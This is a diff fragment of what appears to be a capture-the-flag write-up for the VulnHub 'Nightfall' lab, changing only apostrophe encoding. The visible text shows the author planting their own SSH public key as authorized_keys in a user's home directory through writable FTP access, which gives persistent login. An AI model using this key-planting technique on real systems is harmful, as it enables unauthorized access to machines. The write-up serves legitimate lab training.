@@ -227,7 +227,7 @@ drwxr-xr-x   3 matt     matt         4096 Aug 26 00:42 .local
 -rw-------   1 matt     matt            0 Aug 28 22:41 .sh_history
 226 Transfer complete.
 ftp&gt; 
-</code></pre></div><p>The first thing I noticed was the <code>.gnupg</code> directory but unfortunately I didn&rsquo;t find anything exciting in it. Changing directories outside of <code>matt</code>'s home directory wasn&rsquo;t permitted. I was stuck in the home directory <em>but</em> I had read/write permissions. I also knew the box had SSH access so the plan was to exploit that.</p>
+</code></pre></div><p>The first thing I noticed was the <code>.gnupg</code> directory but unfortunately I didn&rsquo;t find anything exciting in it. Changing directories outside of <code>matt</code>&rsquo;s home directory wasn&rsquo;t permitted. I was stuck in the home directory <em>but</em> I had read/write permissions. I also knew the box had SSH access so the plan was to exploit that.</p>
 <div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/nightfall$ ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/vulnhub/nightfall/ssh
@@ -236,7 +236,7 @@ Enter same passphrase again:
 Your identification has been saved in /home/kali/Documents/vulnhub/nightfall/ssh.
 Your public key has been saved in /home/kali/Documents/vulnhub/nightfall/ssh.pub.
 kali@kali:~/Documents/vulnhub/nightfall$ cp ssh.pub authorized_keys
-</code></pre></div><p>I created a passwordless keypair on my machine. Once I had the authorized_keys file created (which was just a copy of the ssh public key) I created a <code>.ssh</code> directory in <code>matt</code>'s home directory and uploaded the authorized_keys file:</p>
+</code></pre></div><p>I created a passwordless keypair on my machine. Once I had the authorized_keys file created (which was just a copy of the ssh public key) I created a <code>.ssh</code> directory in <code>matt</code>&rsquo;s home directory and uploaded the authorized_keys file:</p>
 <div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ftp&gt; mkdir .ssh
 257 &#34;/.ssh&#34; directory created. 
 ftp&gt; cd .ssh
